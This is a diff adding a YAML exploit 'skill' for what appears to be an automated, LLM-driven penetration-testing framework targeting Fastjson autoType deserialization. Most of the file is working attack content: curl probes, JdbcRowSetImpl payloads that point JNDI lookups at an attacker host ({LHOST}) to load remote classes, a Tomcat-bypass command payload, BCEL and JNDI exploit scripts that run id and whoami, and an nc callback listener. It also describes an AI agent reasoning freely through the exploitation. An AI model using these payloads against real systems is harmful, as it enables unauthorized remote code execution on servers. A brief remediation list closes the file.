@@ -1,0 +1,163 @@
+skill_id: fastjson_rce
+name: "Fastjson autoType 反序列化 RCE"
+category: java_deserialization
+phase: foothold
+version: "2.0"
+
+match:
+  rules:
+    - fingerprint_contains: ["fastjson"]
+    - fingerprint_contains: ["com.alibaba.fastjson"]
+    - cve_matches: ["CVE-2017-18349", "CVE-2022-25845"]
+    - evidence_contains: ["fastjson", "@type"]
+    - json_probe_result: "FASTJSON_DETECTED"
+  exclude:
+    - fingerprint_contains: ["fastjson 2."]
+
+probes:
+  - id: confirm_fastjson
+    description: "确认 fastjson 存在，粗测版本范围"
+    command: |
+      curl -s -X POST {ENDPOINT} \
+        -H "Content-Type: application/json" \
+        -d '{"@type":"java.lang.AutoCloseable"' \
+        --max-time 10 -w "\nHTTP_CODE:%{http_code}"
+    timeout: 15
+    parse_rules:
+      - if_contains: ["autoType is not support", "safeMode"]
+        set: { fastjson_confirmed: true, autotype_blocked: true, version_tier: "gte_1.2.68" }
+      - if_contains: ["type not match", "typeMismatch", "ClassNotFoundException"]
+        set: { fastjson_confirmed: true, autotype_enabled: true, version_tier: "mid_1.2.25_67" }
+      - if_contains: ["com.alibaba.fastjson", "fastjson"]
+        set: { fastjson_confirmed: true }
+      - if_contains: ["HTTP_CODE:4", "HTTP_CODE:5"]
+        set: { json_endpoint_active: true }
+
+  - id: version_probe_47
+    description: "测试 1.2.47 java.lang.Class 缓存绕过"
+    depends_on: { fastjson_confirmed: true }
+    command: |
+      curl -s -X POST {ENDPOINT} \
+        -H "Content-Type: application/json" \
+        -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1/a","autoCommit":true}}' \
+        --max-time 10
+    timeout: 15
+    parse_rules:
+      - if_contains: ["JdbcRowSetImpl", "connection refused", "connect timed out"]
+        set: { bypass_47_works: true, version_tier: "lte_1.2.47" }
+      - if_contains: ["autoType is not support", "deny"]
+        set: { bypass_47_works: false, version_tier: "gte_1.2.48" }
+
+exploit_paths:
+  - path_id: bcel_rce
+    name: "BCEL ClassLoader 本地命令执行"
+    priority: 1
+    conditions:
+      fastjson_confirmed: true
+    steps:
+      - id: bcel_id
+        description: "BCEL 执行 id 命令验证 RCE"
+        command: "python3 {skill_dir}/scripts/bcel_fastjson.py {ENDPOINT} id"
+        timeout: 30
+        success_criteria:
+          stdout_regex: "uid=\\d+\\(\\w+\\)"
+        on_success: bcel_whoami
+        on_fail: next_path
+
+      - id: bcel_whoami
+        description: "确认当前用户"
+        command: "python3 {skill_dir}/scripts/bcel_fastjson.py {ENDPOINT} whoami"
+        timeout: 30
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        on_fail: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_bcel"
+
+  - path_id: jndi_rce
+    name: "JNDI 注入远程类加载"
+    priority: 2
+    conditions:
+      fastjson_confirmed: true
+      env.can_reverse: true
+    steps:
+      - id: jndi_default
+        description: "JNDIExploit 默认 gadget 利用"
+        command: "bash {skill_dir}/scripts/jndi_fastjson.sh {ENDPOINT} {LHOST} id"
+        timeout: 120
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
+        on_success: jndi_confirm
+        on_fail: jndi_tomcat
+
+      - id: jndi_tomcat
+        description: "JNDIExploit Tomcat BeanFactory 绕过（高版本 JDK）"
+        command: |
+          curl -s -X POST {ENDPOINT} \
+            -H "Content-Type: application/json" \
+            -d '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{LHOST}:1389/TomcatBypass/Command/Base64/aWQ=","autoCommit":true}}' \
+            --max-time 15
+        timeout: 120
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_RCE_SUCCESS)"
+        on_success: jndi_confirm
+        on_fail: next_path
+
+      - id: jndi_confirm
+        description: "JNDI RCE 确认"
+        command: "bash {skill_dir}/scripts/jndi_fastjson.sh {ENDPOINT} {LHOST} whoami"
+        timeout: 120
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_jndi"
+
+  - path_id: manual_payloads
+    name: "手工 Payload 验证"
+    priority: 3
+    conditions:
+      fastjson_confirmed: true
+    steps:
+      - id: dns_verify
+        description: "DNS/JNDI 外带验证"
+        command: |
+          LHOST="{LHOST}"
+          if [ -n "$LHOST" ] && [ "$LHOST" != "" ]; then
+            timeout 8 bash -c "
+              echo '' | nc -l -p 13389 &
+              NCPID=\$!
+              sleep 1
+              curl -s -X POST {ENDPOINT} \
+                -H 'Content-Type: application/json' \
+                -d '{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://${LHOST}:13389/test\",\"autoCommit\":true}}' \
+                --max-time 5 > /dev/null 2>&1
+              sleep 3
+              kill \$NCPID 2>/dev/null; wait \$NCPID 2>/dev/null
+            " 2>&1
+            echo "JNDI_CONNECT_TEST_DONE"
+          else
+            echo "NO_LHOST_FOR_DNS"
+          fi
+        timeout: 15
+        success_criteria:
+          stdout_regex: "(uid=\\d+\\(\\w+\\)|JNDI_CONNECT)"
+        on_success: conclude_success
+        on_fail: next_path
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      fastjson_confirmed: true
+
+remediation: |
+  1. 升级至 Fastjson 2.x 或替换为 Jackson/Gson
+  2. 无法升级时启用 safeMode: ParserConfig.getGlobalInstance().setSafeMode(true)
+  3. WAF 拦截包含 @type 的 JSON 请求
+  4. 限制出站网络连接（阻止 JNDI 回连）
